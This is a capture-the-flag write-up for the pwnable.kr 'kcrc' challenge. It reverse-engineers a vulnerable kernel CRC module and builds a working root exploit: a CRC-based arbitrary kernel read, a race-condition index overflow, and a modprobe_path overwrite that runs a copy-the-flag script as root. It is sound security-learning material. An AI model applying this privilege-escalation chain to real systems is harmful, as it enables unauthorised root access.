# kcrc - pwnable.kr

This is the 3rd `Hacker's Secret` challenge we tackle. This might be a bit of a harder one, but as I mentioned in the last post, we are continuing with the kernel exploitation.

```
This is a simple CRC calculator for kernel module programming exercise.
I bet there are no bugs. 
but you can check it if you want.

ssh kcrc@pwnable.kr -p2222 (pw: flag of syscall)
```

I must say I am not really excited for the CRC part, but let's get started. I began by `ssh`ing and noticed, contrary to `exynos`, we get the files. So I used scp to copy them over.

```shell
~/pwn/kcrc$ ls
bzImage  ramdisk.img
```

These are the only files that matter to us. The `bzImage` is the kernel image (vmlinuz), while the `ramdisk.img` is the `ext2` filesystem.

We can simply mount the filesystem like so:

```shell
sudo mount -o loop ramdisk.img fs
```

And then look at it:
```shell
~/pwn/kcrc$ ls fs
bin  flag         kcrc.ko.id0  kcrc.ko.nam  linuxrc     sbin  var
dev  kcrc.ko      kcrc.ko.id1  kcrc.ko.til  lost+found  tmp
etc  kcrc.ko.i64  kcrc.ko.id2  lib          proc        usr
```

And `kcrc.ko` is the module we need to pwn. 

## kmodule Overview

I'm just going to insert it straight into IDA pro and take a look. The kernel module contains a `kcrcinit` function, a `kcrcexit` function, and `kread`/`kwrite` functions. I assume the exit is irrelevant, so we'll look at the others. Note I've added some relevant comments to parts due to the decompilation messing up (hexrays fix it):
```c
int kcrcinit()
{
  proc_dir_entry *proc_entry; // eax

  printk("[+] kcrc module loaded\n");
  g_idx = 0;
  proc_entry = (proc_dir_entry *)create_proc_entry(0, 438);
  procfile = proc_entry;
  if ( proc_entry )
  {
    proc_entry->read_proc = (read_proc_t *)kread;
    proc_entry->write_proc = (write_proc_t *)kwrite;
    return 0;
  }
  else
  {
    printk(byte_8000287);
    return -12;
  }
}

size_t __usercall kread@<eax>(char *buf@<eax>)
{
  uint32_t *kcrc; // esi
  unsigned int v3; // eax
  int v4; // edx
  char *v5; // edi
  uint32_t *v6; // esi
  __int16 v8; // dx

  kcrc = ::kcrc;
  v3 = 1024;
  // fix buf alignment in a weird way?
  if ( ((unsigned __int8)buf & 1) != 0 )
  {
    kcrc = (uint32_t *)((char *)::kcrc + 1);
    *buf++ = ::kcrc[0];
    v3 = 1023;
    if ( ((unsigned __int8)buf & 2) == 0 )
      goto LABEL_3;
  }
  else if ( ((unsigned __int8)buf & 2) == 0 )
  {
    goto LABEL_3;
  }
  v8 = *(_WORD *)kcrc;
  v3 -= 2;
  kcrc = (uint32_t *)((char *)kcrc + 2);
  *(_WORD *)buf = v8;
  buf += 2;
LABEL_3:
  v4 = 0;
  qmemcpy(buf, kcrc, 4 * (v3 >> 2));
  v6 = &kcrc[v3 >> 2];
  v5 = &buf[4 * (v3 >> 2)];
  if ( (v3 & 2) != 0 )
  {
    *(_WORD *)v5 = *(_WORD *)v6;
    v4 = 2;
  }
  if ( (v3 & 1) != 0 )
    v5[v4] = *((_BYTE *)v6 + v4);
  return 1024;
}

int __fastcall kwrite(unsigned int len)
{
  int retval; // esi
  int v2; // edi
  int v3; // edi
  unsigned int v5; // eax
  uint32_t length; // edi
  uint32_t crc_result; // edx
  int *cur_ptr; // ebx
  char byte; // cl
  int crc_res; // edx
  uint32_t op; // [esp+8h] [ebp-18h]
  int *ptr; // [esp+Ch] [ebp-14h]
  uint32_t l; // [esp+10h] [ebp-10h]

  retval = -1;
  if ( len != 12 )
    return retval;
  LOBYTE(len) = 4;                              // decompiler is shit :(

  v2 = copy_from_user(len);                     // op is first 4 bytes
  v3 = copy_from_user(4) + v2;                  // ptr is second 4 bytes
  if ( copy_from_user(4) + v3 )                 // l is last 4 bytes
    return retval;
  if ( op == 0xADD )
  {
    if ( g_idx != 256 )
    {
      length = l;
      crc_result = -1;
      for ( cur_ptr = ptr; length; --length )
      {
        byte = *(_BYTE *)cur_ptr;
        cur_ptr = (int *)((char *)cur_ptr + 1);
        crc_result = crc32_tab[(unsigned __int8)(crc_result ^ byte)] ^ (crc_result >> 8);
      }
      crc_res = ~crc_result;
      retval = 1;
      kcrc[g_idx] = crc_res;
      printk("crc generated! %x\n", crc_res);
      ++g_idx;
    }
    return retval;
  }
  if ( op != 0xDE1 )
    return 0;
  v5 = g_idx;
  if ( !g_idx )                                 // if g_idx is 0, we fail
    return retval;
  --g_idx;
  kcrc[v5 - 1] = 0;                             // delete last crc byte?
  return 0;
}
```

note that the `copy_from_user` calls are probably messed up due to it being a macro. I don't really have an idea why; but the gist of it is that it reads 4 bytes from the given `buf` each time, each to the variable I've commented there (it's easier to read the disassembly at this point).

I want some clarity regarding the APIs here, so I want to understand what this casting means:
```c
proc_entry->read_proc = (read_proc_t *)kread;
proc_entry->write_proc = (write_proc_t *)kwrite;
```

Let's research this via the kernel source code:
```c
typedef	int (read_proc_t)(char *page, char **start, off_t off,
			  int count, int *eof, void *data);
typedef	int (write_proc_t)(struct file *file, const char __user *buffer,
			   unsigned long count, void *data);
```

Okay, so that means there are some arguments that for some reason the IDA decompiler has hidden from us. My guess is that it is simply because they're not used, but I do not actually know. 

While trying to further understand these arguments, I've stumbled upon this [kernel source code function](https://elixir.bootlin.com/linux/v3.7.1/source/fs/proc/generic.c#L42) that has this comment:
```
/*
			 * How to be a proc read function
			 * ------------------------------
			 * Prototype:
			 *    int f(char *buffer, char **start, off_t offset,
			 *          int count, int *peof, void *dat)
			 *
			 * Assume that the buffer is "count" bytes in size.
			 *
			 * If you know you have supplied all the data you
			 * have, set *peof.
			 *
			 * You have three ways to return data:
			 * 0) Leave *start = NULL.  (This is the default.)
			 *    Put the data of the requested offset at that
			 *    offset within the buffer.  Return the number (n)
			 *    of bytes there are from the beginning of the
			 *    buffer up to the last byte of data.  If the
			 *    number of supplied bytes (= n - offset) is 
			 *    greater than zero and you didn't signal eof
			 *    and the reader is prepared to take more data
			 *    you will be called again with the requested
			 *    offset advanced by the number of bytes 
			 *    absorbed.  This interface is useful for files
			 *    no larger than the buffer.
			 * 1) Set *start = an unsigned long value less than
			 *    the buffer address but greater than zero.
			 *    Put the data of the requested offset at the
			 *    beginning of the buffer.  Return the number of
			 *    bytes of data placed there.  If this number is
			 *    greater than zero and you didn't signal eof
			 *    and the reader is prepared to take more data
			 *    you will be called again with the requested
			 *    offset advanced by *start.  This interface is
			 *    useful when you have a large file consisting
			 *    of a series of blocks which you want to count
			 *    and return as wholes.
			 *    (Hack by Paul.Russell@rustcorp.com.au)
			 * 2) Set *start = an address within the buffer.
			 *    Put the data of the requested offset at *start.
			 *    Return the number of bytes of data placed there.
			 *    If this number is greater than zero and you
			 *    didn't signal eof and the reader is prepared to
			 *    take more data you will be called again with the
			 *    requested offset advanced by the number of bytes
			 *    absorbed.
			 */
```

This might be intersting for us due to the `kread` function not really handling it like documented. Let's keep that in mind.

Now, this also gave us a bit of information about the arguments, and we can summarize them for each of the functions. 

For `kread`: 
```
 page  - PAGE_SIZE buffer to fill
 start - set *start for returning partial data
 off   - file offset
 count - number of bytes to write
 peof   - set *peof when all data has been written
 data  - client-specific pointer
 ```

And for `kwrite`:
```
file   - struct file pointer for the proc entry
buffer - user-space buffer containing data to write
count  - number of bytes to write
data   - client-specific pointer
```

We'll get enough source code reading later on I presume, so let's start trying to understand the code of each function.

### Understanding the Functions

So, let's start with `kcrcinit`. The function is the simplest, using the `create_proc_entry()` linux API to create a `/proc/kcrc` file with the `kread/kwrite` callbacks for `read/write` operations:

```c
proc_entry = (proc_dir_entry *)create_proc_entry(0, 438);
procfile = proc_entry;
if ( proc_entry )
{
    proc_entry->read_proc = (read_proc_t *)kread;
    proc_entry->write_proc = (write_proc_t *)kwrite;
    return 0;
}
```

There is no need for us to talk about this function anymore. All we need to know is that it "mounts" the `kcrc` into `/proc` with these functions.

`kread`, is a bit more difficult to understand at first. It initializes a local variable that is a pointer to the `kcrc` table (which is a table of 256 `uint32_t`):
```c
kcrc = ::kcrc;
v3 = 1024;
```

And then it starts checking for the alignment of the `buf` argument given and fixing it to be `dword` aligned:
```c
f ( ((unsigned __int8)buf & 1) != 0 )
{
    kcrc = (uint32_t *)((char *)::kcrc + 1);
    *buf++ = ::kcrc[0];
    v3 = 1023;
    if ( ((unsigned __int8)buf & 2) == 0 )
        goto LABEL_3;
}
else if ( ((unsigned __int8)buf & 2) == 0 )
{
    // this here means we're aligned.
    goto LABEL_3;
}
v8 = *(_WORD *)kcrc;
v3 -= 2;
kcrc = (uint32_t *)((char *)kcrc + 2);
*(_WORD *)buf = v8;
buf += 2;
```

That is quite a weird behaviour, which I was unsure what it meant. It seems as if it uses `rep movsd` so it needs to be aligned to 32-bit chunks. However, the part that confused me the most was that according to the documentation above, it seems to get a `page` which is always aligned to `PAGE_SIZE`, so the logic shouldn't run. Let's assume, for now, that we can ignore it and read the rest of the logic.

Assuming we're aligned, this is what happens now:
```c
  v4 = 0;
  qmemcpy(buf, kcrc, 4 * (v3 >> 2));
  v6 = &kcrc[v3 >> 2];
  v5 = &buf[4 * (v3 >> 2)];
  if ( (v3 & 2) != 0 )
  {
    *(_WORD *)v5 = *(_WORD *)v6;
    v4 = 2;
  }
  if ( (v3 & 1) != 0 )
    v5[v4] = *((_BYTE *)v6 + v4);
  return 1024;
```

`v3` holds the number of bytes to copy, and we copy them (4 bytes each time) into `buf` from `kcrc`. Afterwards, `v6` points to the end of the `kcrc` array, and `v5` points to the end of the `buf` array, and they again perform a re-alignment in case they needed to copy over some more data from the end (either a byte or a word). This is pretty weird, so let's just keep in mind that these alignment fixes might be of use later on.

Now, `kwrite`. This part is generally more to me. Let's try to dive in and see if we can find anything:

```c
  retval = -1;
  if ( len != 12 )
    return retval;
  LOBYTE(len) = 4; // decompiler is shit :(

  v2 = copy_from_user(len); // op is first 4 bytes
  v3 = copy_from_user(4) + v2; // ptr is second 4 bytes
  if ( copy_from_user(4) + v3 )  // l is last 4 bytes
    return retval;
```

It starts with a validation on the length of data written which enforces only 12 bytes written:
```shell
/ $ echo "AAAA" > /proc/kcrc
sh: write error: Operation not permitted
/ $ echo 'AAAAAAAAAAAA' > /proc/kcrc
sh: write error: Operation not permitted
/ $ echo -ne 'AAAAAAAAAAAA' > /proc/kcrc
```

Afterwards, it parses it by safely copying 4 bytes into `op`, `ptr` and `l`, consecutively, from the user buffer given. The check that sums them all up seems to check whether any bytes were unable to be copied.

Now, after its done that, it checks the given `op`:
```c
 if ( op == 0xADD )
  {
    if ( g_idx != 256 )
    {
      length = l;
      crc_result = -1;
      for ( cur_ptr = ptr; length; --length )
      {
        byte = *(_BYTE *)cur_ptr;
        cur_ptr = (int *)((char *)cur_ptr + 1);
        crc_result = crc32_tab[(unsigned __int8)(crc_result ^ byte)] ^ (crc_result >> 8);
      }
      crc_res = ~crc_result;
      retval = 1;
      kcrc[g_idx] = crc_res;
      printk("crc generated! %x\n", crc_res);
      ++g_idx;
    }
    return retval;
  }
```

If the required operation is to add to the `kcrc` table, it iterates over the user given `ptr` (which is not checked by the way) and reads `l` bytes from it calculating the CRC on the reads. It then writes the negated result into the `kcrc[g_idx]` (unfortunately, it seems as if the `g_idx` is protected from overflowing there).

The other `op` is `0xDE1`:
```C
if ( op != 0xDE1 )
    return 0;
v5 = g_idx;
if ( !g_idx )  // if g_idx is 0, we fail
    return retval;
--g_idx;
kcrc[v5 - 1] = 0; // delete last crc byte?
return 0;
```

So, there's no underflow here, unfortunately (it does not decrement if it's 0) nor is there a null-byte overflow here (we cannot pass over 256 in the former part of the function).

Okay, so the flow of the `kcrc` module, albeit frightening, is pretty okay. I must say I am intrigued by the fact we can practically give it any `ptr` we want and it'll read from it and calculate `crc` on it. I don't have an idea of exploitation yet, but we've just gotten started. 

## Tinkering

At this part, we get the gist of the code. I am intrigued to see it working.

I began by writing this (also, note we have access to the addresses of `/proc/kallsyms`):
```c
/ $ cat /proc/kallsyms | grep sys_call
c11b48c0 t proc_sys_call_handler.isra.8
c15fa020 R sys_call_table
/ $ echo -ne '\xdd\x0a\x00\x00\x20\xa0\x5f\xc1\x64\x00\x00\x00' > /proc/kcrc
[ 1731.315997] crc generated! 1a2bdb67
```

Which gave me the CRC of the 100 bytes of the sys_call_table! Now, this actually gave me an idea. We control the memory we read, and also the amount of memory we read. Does this not give us a strong primitive of arbitrary-read?

If we read 1 byte at a time, we can simply calculate the byte directly from the CRC!

So, we have an arbitrary read primitive here which is quite strong as it can read kernel data freely. 

I decided to try it out to see whether we can actually use it. I wrote a `crc reversing` algorithm which is quite simple, and used it on each CRC I got for the first address of the `sys_call_table`:
```shell
/ $ echo -ne '\xdd\x0a\x00\x00\x20\xa0\x5f\xc1\x01\x00\x00\x00' > /proc/kcrc
[ 2954.621045] crc generated! 54d13d59
sh: write error: Operation not permitted
/ $ echo -ne '\xdd\x0a\x00\x00\x21\xa0\x5f\xc1\x01\x00\x00\x00' > /proc/kcrc
[ 2968.220273] crc generated! 92dde4eb
sh: write error: Operation not permitted
/ $ echo -ne '\xdd\x0a\x00\x00\x22\xa0\x5f\xc1\x01\x00\x00\x00' > /proc/kcrc
[ 2981.614489] crc generated! a2681b02
sh: write error: Operation not permitted
/ $ echo -ne '\xdd\x0a\x00\x00\x23\xa0\x5f\xc1\x01\x00\x00\x00' > /proc/kcrc
[ 2991.314071] crc generated! 3e611dab
sh: write error: Operation not permitted

~/pwn/kcrc$ ./reverse-crc 0x54d13d59
Byte: 0xd0
~/pwn/kcrc$ ./reverse-crc 0x92dde4eb
Byte: 0xea
~/pwn/kcrc$ ./reverse-crc 0xa2681b02
Byte: 0x05
~/pwn/kcrc$ ./reverse-crc 3e611dab
Byte: 0xc1

/ $ cat /proc/kallsyms | grep c105ead0
c105ead0 T sys_restart_syscall
```

This was actually pretty crazy to me that it worked first time. That gives us an extremely strong primitive that basically lets us read the entire virtual memory space of both the kernel and the user (of course within read permissions of the pages), due to not checking whether the `ptr` provided is valid. 

Later on, we will make the `crc reversing` script more generic and make it interact with the `/proc/kcrc` itself, of course. First, we need to understand what kind of attack we want to do, and understand if we have any other primitives.

Now, we are even able to read the `idx` or `procfile` global variables from the kernel (let's keep that in mind as well): 
```shell
/ $ cat /proc/kallsyms | grep -F "[kcrc]"
c8806080 r crc32_tab    [kcrc]
c88051e0 t kcrcexit     [kcrc]
c8807000 d __this_module        [kcrc]
c88051e0 t cleanup_module       [kcrc]
c88051b0 t crc32        [kcrc]
c8807584 b idx  [kcrc]
c8805000 t kread        [kcrc]
c8807180 b kcrc [kcrc]
c8807580 b procfile     [kcrc]
c88050a0 t kwrite       [kcrc]
```

Okay, so reading whatever we want is super powerful. We also know the addresses of `kcrc` module symbols, which is also great. We are lacking, however, a write primitive. 

I thought maybe by passing an arbitrary buffer to the `kread` function we can read our `crc` values into it; but unfortunately the buffer IS a temporary kernel page that is later on copied into our buffer via `copy_to_user`, so no luck there:
```c
static ssize_t
__proc_file_read(struct file *file, char __user *buf, size_t nbytes,
	       loff_t *ppos)
{
    ...
    if (!(page = (char*) __get_free_page(GFP_TEMPORARY)))
            return -ENOMEM;
    ...
    n = dp->read_proc(page, &start, *ppos,
                        count, &eof, dp->data);
    ...
    n -= copy_to_user(buf, start < page ? page : start, n);
    ...
}
```

## Exploitation

After some thinking, I have understood something interesting. 

The `kwrite` function uses `idx` without any lock, although it can be executed consecutively. That means there's a race condition here that we can leverage. Imagine a situation in which the `idx` is `255`, and two threads (which run in 2 separate CPU cores) call `kwrite`. If they both reach the `for` loop that computes the `CRC` before either of them incremented the `idx`, we've got a race condition that'll actually increment the `idx` twice and we'll reach `idx = 257`. 

That is an interesting scenario, and is only useful if there's something interesting after the `kcrc` array. 

```c
.bss:08000A60 ; uint32_t kcrc[256]
.bss:08000A60 kcrc            dd 100h dup(?)          ; DATA XREF: kread+11↑o
.bss:08000A60                                         ; kread:loc_8000060↑r ...
.bss:08000E60                 public procfile
.bss:08000E60 ; proc_dir_entry *procfile
.bss:08000E60 procfile        dd ?                    ; DATA XREF: kcrcinit+2D↑w
.bss:08000E64                 public idx
.bss:08000E64 ; unsigned int idx
.bss:08000E64 idx             dd ?                    ; DATA XREF: kwrite:loc_8000118↑r
.bss:08000E64
```

So, after the `kcrc`, we have `procfile` and `idx`. Which one would be interesting for us to overwrite? Obviously, `idx`. Overwriting `procfile` is redundant as it is only a pointer to a kernel struct, and changing it does not do anything.

So, by calculation it is clear that when we're in `idx = 257` (post race overwrite), we overwrite `idx`. That means that we can write a CRC32 value into the `idx`, and that'll give us an arbitrary write (which will write CRC32 values). On the surface, this sounds horribly weak; CRC32 values are seemingly random, and it sounds very prone to errors.

That would be the case.. But, we control the data we CRC, as well as the length. And, if we actually take the time to research a bit more, we can see that CRC32 is actually bijective, due to the fact CRC32 is a calculation of remainder over GF(2). For more information, and a POC that shows this, [this is a nice resource](https://yurichev.com/news/20211224_CRC32/). That means that we can brute-force CRC32 to find what 32-bit value we need to feed it in order to get our required `idx` or data to overwrite. This gives us an arbitrary write primitive (except for `procfile`, which is at `idx = 256`).

### Implementing the Race Condition

Our race is pretty simple:

```c
void *write_thread(void *arg) {
    long cpu = (long)arg;
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);  // Pin to available CPUs
    if (sched_setaffinity(0, sizeof(cpuset), &cpuset) < 0) {
        perror("sched_setaffinity");
    }

    int fd = open(PROC_FILE, O_RDWR);
    if (fd < 0) {
        perror("open in thread");
        return NULL;
    }

    // Read a lot to stall and ensure there's a race. :)
    uint32_t wd[3] = {0xADD, 0xc1000000, 0x1f0000};  

    // Wait for all threads to be ready
    pthread_barrier_wait(&barrier);

    // All threads write as simultaneously as possible
    printf("Writing in thread %d", cpu);

    if (write(fd, wd, sizeof(wd)) != 1) {
        perror("write in thread");
    }
    else {
        printf("Success!\n");
    }

    return NULL;
}
```

This'll be the function that each thread executes. Note that we pin each of the threads to a different core to ensure they both run consecutively.

Then, our main will perform 255 `kwrite` calls in order to get `idx = 255` to perform our race:

```c
int main() {
    int fd = open(PROC_FILE, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    for (int i = 0; i < 255; i++) {
        if (write(fd, wd, sizeof(wd)) != 1) {
            perror("initial write");
            close(fd);
            return 1;
        }
    }

    // Initialize barrier for NUM_THREADS threads + main
    // We need this barrier
    if (pthread_barrier_init(&barrier, NULL, NUM_THREADS + 1) != 0) {
        perror("pthread_barrier_init");
        close(fd);
        return 1;
    }

    int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    printf("Detected %d CPUs; pinning threads across them.\n", num_cpus);

    pthread_t threads[NUM_THREADS];
    int shared_fd = fd;

    // Create threads
    for (long i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, write_thread, (void*)i) != 0) {
            perror("pthread_create");
            close(fd);
            return 1;
        }
    }

    // Main waits with threads
    pthread_barrier_wait(&barrier);

    // Join threads
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    pthread_barrier_destroy(&barrier);
}
```

Running it yields us:
```c
...
[   58.276922] crc generated! 0
[   58.277031] crc generated! 0
[   58.277136] crc generated! 0
[   58.277235] crc generated! 0
[   58.277345] crc generated! 0
[   58.277461] crc generated! 0
[   58.277567] crc generated! 0
[   58.277665] crc generated! 0
Detected 2 CPUs; pinning threads across them.
[   58.877437] crc generated! d6c56841
Writing in thread 1
Writing in thread 0
Success!
[   58.890106] crc generated! d6c56841
Success!
```

We've successfully overflown `idx` using the race. 

### Exploitation Plan

At this point, we have an arbitrary write/read in the kernel.
Because of the fact there's the `procfile` variable whose existence confused me, my first instict was to use it somehow. 

We can craft a clever plan that does the following, then:

1. Read where `procfile` points to (which is the kernel struct `proc_dir_entry`).
2. Calculate the needed `idx`, and find a matching CRC via bruteforce (note that the address of `procfile` is changing).
3. Overwrite the `write_proc` to point to our arbitrary code.
4. `commit_creds(prepare_kernel_cred(0))` & ret2usr.

This is a pretty heavy plan to implement. We need to perform an arbitrary read, then perform brute-forces of CRC32, and then write a `ret2usr` exploit into an `mmap`'d area.

This will work, but we can do better.

Some reading led me to something called `modprobe_path`, which is often used for kernel exploitation in place of `commit_creds` and `prepare_kernel_cred` as it is much simpler. 

But, what is it? `modprobe` is a linux program that is executed when we load/unload a kernel module. The path to the linux program is embedded as a symbol in the kernel which is the `modprobe_path`. 

The strong primitive about this is the fact that it is in a writable page (we can overwrite it), the address is exposed via `/proc/kallsyms` (which we've got access to), and the program whose path is stored in `modprobe_path` is executed when a file with an unknown type is executed. That means that if we try to execute a file that we write junk into, it will execute the program in `modprobe_path`. That means we can overwrite it with a random shell script, and it'll be executed in kernel mode. That is arbitrary code execution with root privileges, which is exactly what we're looking for.

With this, we can form a much simpler plan:

1. Overwrite `idx` with the correct value to overwrite `modprobe_path`.
2. Overwrite `modprobe_path` with the path of our shell script.
3. Execute a file with an unknown file type.

I will spare the details regarding the CRC brute force, and we'll get straight to the implementation of the rest of the exploit.
I decided to overwrite the `modprobe_path` with the value `/tmp/x`.

Now, we want to find the addresses of `kcrc` and `modprobe_path`:

```shell
/ $ cat /proc/kallsyms | grep -F "[kcrc]"
...
c880e180 b kcrc [kcrc]
...
/ $ cat /proc/kallsyms | grep "modprobe_path"
c187d3c0 D modprobe_path
```

And calculate the `idx` accordingly:

```c
int32_t idx = -29246320; // (0xc187d3c0 - 0xc880e180) / 4
--idx; // it will be incremented after being overwritten.
```

Now, we will use our CRC32 brute-forcing scripts to achieve:

```c
uint32_t idx_crc[] = {0xEB40C81B};
uint32_t tmp_x_crc_lo[] = {0x24F045B3};
uint32_t tmp_x_crc_hi[] = {0xA6C3DCA5};
```

Implement a function to write our specific data using `kwrite` to achieve whatever CRC result we want:

```c
void single_write(int fd, uint32_t* buf)
{
    uint32_t wd[3] = {0xADD, buf, sizeof(uint32_t)};
    if (write(fd, wd, sizeof(wd)) != 1) {
        perror("single write");
    }
}
```

And add the writes to the end of our `main`:

```c
printf("Overwriting idx...\n");
single_write(fd, idx_crc);

printf("Overwriting modprobe_path...\n");
single_write(fd, tmp_x_crc_lo);
single_write(fd, tmp_x_crc_hi);
```

Let's run it and check whether we've successfully overwritten it by putting a breakpoint after our last write:

```c
pwndbg> x/s 0xc187d3c0
0xc187d3c0:     "/tmp/x"
```

Now, the only thing left is to create a shell script in `/tmp/x`, and a dummy file to execute. We can do so like this:

```c
void get_flag(void){
    puts("[*] In userspace, setting up for fake modprobe...");
    
    // Craft shellscript that'll be called when modprobe is called.
    // The script simply copies flag to /tmp and gives us permission.
    system("echo '#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    // Create a dummy script to execute in order to call modprobe.
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    // Run the dummy.
    puts("[*] Running file with unknown signature...");
    system("/tmp/dummy");

    puts("[*] Opening copied flag file...");
    system("cat /tmp/flag");

    exit(0);
}
```

The function is self-explanatory, and we'll call it at the end of our `main`.

When we execute it all and piece it all together, we get:

```shell
...
[    2.664200] crc generated! 0
[    2.664270] crc generated! 0
[    2.664359] crc generated! 0
[    2.664426] crc generated! 0
[    2.664510] crc generated! 0
[    2.664585] crc generated! 0
Detected 2 CPUs; pinning threads across them.
[    2.667637] crc generated! 64456d4e
[    2.667689] crc generated! 64456d4e
Writing in thread 1
Writing in thread 0
Success!
Success!
Overwriting idx...
[    2.669832] crc generated! fe41bc8f
Overwriting modprobe_path...
[    2.670351] crc generated! 706d742f
[    2.670769] crc generated! 782f
[*] In userspace, setting up for fake modprobe...
[*] Running file with unknown signature...
/tmp/dummy: line 1: ����: not found
[*] Opening copied flag file...
dummy_flag_get_realone
```

pwned

## Conclusion

This was an incredible challenge and a great learning journey. I did not document everything thoroughly; there were a lot of linux kernel source code reading and tinkering with `gdb` to try and bypass stuff and understand it all. I highly recommend trying it yourself (maybe with the other solution I did not implement here) to challenge yourself.